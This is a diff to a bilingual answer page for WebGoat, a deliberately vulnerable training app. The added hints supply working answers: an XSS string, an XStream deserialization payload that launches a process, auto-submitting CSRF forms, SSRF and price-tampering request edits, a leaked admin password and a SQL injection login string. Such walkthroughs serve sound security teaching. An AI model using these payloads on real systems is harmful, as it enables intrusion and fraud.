@@ -144,18 +144,12 @@
             <br>
             <br>
             6. Retrouver l'en-tête à l'aide de l'onglet <i>Réseau</i> des <i>Outils de développement</i>.
-            <br>
-            <br>
-            Remarque importante : ces leçons sont les premières leçons d'un grand nombre de leçon buggée au niveau de l'interface graphique. Le numéro d'exercice ne devient pas vert malgré le message de réussite. Voir ce <a href="https://github.com/WebGoat/WebGoat/issues/619">topic</a>.
         </span>
         <span class="multilang" lang="en">
             4. Follow the instructions.
             <br>
             <br>
             6. Retrieve the header using the <i>Network</i> tab of the <i>Development Tools</i>.
-            <br>
-            <br>
-            Important note: These lessons are the first lessons of a lot of buggy lesson at the GUI. The exercise number does not turn green despite the success message. See this <a href="https://github.com/WebGoat/WebGoat/issues/619"> topic </a>.
         </span>
     </div>
 </div>
@@ -1085,6 +1079,50 @@
         <div><br></div>
         <h5>Vulnerable Components</h5>
         <div><br></div>
+        <span class="multilang" lang="fr">
+			5. Copier-coller <code>Ok&lt;script&gt;XSS&lt;/script&gt;</code> dans chaque case.
+		</span>
+        <span class="multilang" lang="en">
+			5. Copy-paste <code>Ok&lt;script&gt;XSS&lt;/script&gt;</code> that in each box.
+		</span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+			12. Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/  pour comprendre comment cela fonctionne.
+		</span>
+        <span class="multilang" lang="en">
+			12. For the deserialization:  go to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/  to read about why it works.
+		</span>
+		<code>
+			<br>
+			&lt;sorted-set&gt;  
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp; &lt;string&gt;foo&lt;/string&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp; &lt;dynamic-proxy&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;handler class="java.beans.EventHandler"&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;target class="java.lang.ProcessBuilder"&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;command&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/command&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/target&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;action>start&lt;/action&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/handler&gt;
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp; &lt;/dynamic-proxy&gt;
+			<br>
+			&lt;/sorted-set&gt;
+			<br>
+		</code>
     </div>
 </div>
 
@@ -1097,11 +1135,23 @@
         <h5>Cross-Site Request Forgeries</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-            3. Cliquer sur <b>Envoyer</b>, copier l'adresse dans la barre d'URL, ouvrir un nouvel onglet, coller l'adresse.
+            3. Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
         </span>
         <span class="multilang" lang="en">
-            3. Click on <b>Send</b>, copy the URL, open a new tab, paste the adress.
+            3. Save the following code in a file <b>csrf.html</b> and open it in a web browser..
         </span>
+        <br>
+        <code>
+            <br>
+			&lt;form name="attack" action="http://host:port/WebGoat/csrf/basic-get-flag" method="POST"&gt;
+            <br>
+			&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='csrf' value='true'&gt;
+            <br>
+			&lt;/form&gt;
+            <br>
+            &lt;script&gt;document.attack.submit();&lt;/script&gt;
+            <br>
+        </code>
         <div><br></div>
         <span class="multilang" lang="fr">
             4. Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
@@ -1112,7 +1162,7 @@
         <br>
         <code>
             <br>
-            &lt;form name="attack" action="http://host:port/WebGoat/csrf/feedback/message" method="POST"&gt;
+            &lt;form name="attack" action="http://host:port/WebGoat/csrf/review" method="POST"&gt;
             <br>
             &nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='reviewText' value='This App Rocks'&gt;
             <br>
@@ -1155,6 +1205,19 @@
         <div><br></div>
         <h5>Server-Side Request Forgeries</h5>
         <div><br></div>
+        <span class="multilang" lang="fr">
+			2. Intercepter la requête et modifier le corps <code>url=images/tom.png</code> en <code>url=images/jerry.png</code>.
+		</span>
+        <span class="multilang" lang="en">
+			2. Intercept the request and modify the body <code>url=images/tom.png</code> in <code>url=images/jerry.png</code>.
+		</span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+			3. Intercepter la requête et modifier le corps <code>url=images/cat.png</code> en <code>url=http://ifconfig.pro</code>.
+		</span>
+        <span class="multilang" lang="fr">
+			3. Intercept the request and modify the body <code>url=images/cat.png</code> in <code>url=http://ifconfig.pro</code>.
+		</span>
     </div>
 </div>
 
@@ -1167,16 +1230,63 @@
         <div><br></div>
         <h5>Bypass front-end restrictions</h5>
         <div><br></div>
+        <span class="multilang" lang="fr">
+			2. Intercepter la requête et modifier le corps <code>select=option1&amp;radio=option1&amp;checkbox=on&amp;shortInput=12345</code> en 
+			<code>select=option3&amp;radio=option3&amp;checkbox=a&amp;shortInput=123456</code>.
+		</span>
+        <span class="multilang" lang="en">
+			2. Intercept the request and modify the body <code>select=option1&amp;radio=option1&amp;checkbox=on&amp;shortInput=12345</code> in 
+			<code>select=option3&amp;radio=option3&amp;checkbox=a&amp;shortInput=123456</code>.
+		</span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+			3. Intercepter la requête et modifier le corps <code>field1=abc&amp;field2=123&amp;field3=abc+123+ABC&amp;field4=seven&amp;field5=01101&amp;field6=90210-1111&amp;field7=301-604-4882&amp;error=0</code> en 
+			<code>field1=abcz&amp;field2=123z&amp;field3=abc+123+ABC'z&amp;field4=sevenz&amp;field5=01101z&amp;field6=90210-1111z&amp;field7=301-604-4882z&amp;error=0</code>.
+		</span>
+        <span class="multilang" lang="en">
+			3. Intercept the request and modify the body <code>field1=abc&amp;field2=123&amp;field3=abc+123+ABC&amp;field4=seven&amp;field5=01101&amp;field6=90210-1111&amp;field7=301-604-4882&amp;error=0</code> in 
+			<code>field1=abcz&amp;field2=123z&amp;field3=abc+123+ABC'z&amp;field4=sevenz&amp;field5=01101z&amp;field6=90210-1111z&amp;field7=301-604-4882z&amp;error=0</code>.
+		</span>
     </div>
     <div>
         <div><br></div>
         <h5>HTML tampering</h5>
         <div><br></div>
+        <span class="multilang" lang="fr">
+			2. Intercepter la requête et modifier le corps <code>QTY=1&amp;Total=2999.99</code> en <code>QTY=2&amp;Total=0</code>.
+		</span>
+        <span class="multilang" lang="en">
+			2. Intercept the request and modify the body <code>QTY=1&amp;Total=2999.99</code> in <code>QTY=2&amp;Total=0</code>.
+		</span>
     </div>
     <div>
         <div><br></div>
         <h5>Client side filtering</h5>
         <div><br></div>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+			2. Rechercher dans le code source pour voir que l'identifiant de Neville Bartholomew est le 112.
+			<br>
+			Modifier le HTML en rajoutant une option <code>&lt;option value="112" label="Neville Bartholomew&gt;Neville Bartholomew&lt;/option&gt;</code>.
+			<br>
+			Récupérer son salaire qui est de <b>450000</b>.
+		</span>
+        <span class="multilang" lang="en">
+			2. Look up in the HTML source code to find the  Neville Bartholomew Id's (112).
+			<br>
+			Modify the HTML to add the option <code>&lt;option value="112" label="Neville Bartholomew&gt;Neville Bartholomew&lt;/option&gt;</code>.
+			<br>
+			Get its salary, which is <b>450000</b>.
+		</span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+			2. Cliquer sur <b>Buy</b> sans rentrer de <b>CHECKOUT CODE</b> pour voir qu'une requête est faite vers 
+			http://host:port/WebGoat/clientSideFiltering/challenge-store/coupons/ . La réponse à cette requête est l'ensemble des coupons valides, parmi lesquels <b>get_it_for_free</b> qui permet un discount de 100%.
+		</span>
+        <span class="multilang" lang="en">
+			Click on <b>Buy</b> without entering any <b>CHECKOUT CODE</b> to see a request to
+			http://host:port/WebGoat/clientSideFiltering/challenge-store/coupons/. The answer to this request is the set of valid coupons, among which <b>get_it_for_free</b> which allows a reduction of 100%.
+		</span>
     </div>
 </div>
 
@@ -1194,11 +1304,28 @@
         <div><br></div>
         <h5>Admin lost password</h5>
         <div><br></div>
+        <span class="multilang" lang="fr">
+			Télécharger l'image http://host:port/WebGoat/images/webgoat2.png .
+			<br>
+			L'ouvrir dans un éditeur de texte.
+			<br>
+			Rechercher la chaine de caratère <b>admin</b> pour tomber sur le mot de passe <b>!!webgoat_admin_1234!!</b>.
+		</span>
+        <span class="multilang" lang="en">
+			Download the image http://host:port/WebGoat/images/webgoat2.png .
+			<br>
+			Open it in a text editor.
+			<br>
+			Look up for the string <b>admin</b> to find the password <b>!!webgoat_admin_1234!!</b>.
+		</span>
     </div>
     <div>
         <div><br></div>
         <h5>Without password</h5>
         <div><br></div>
+        <span class="multilang" lang="fr">
+		Username: <b>Larry</b> Password: <b>' or 1=1 --</b>
+		</span>
     </div>
     <div>
         <div><br></div>
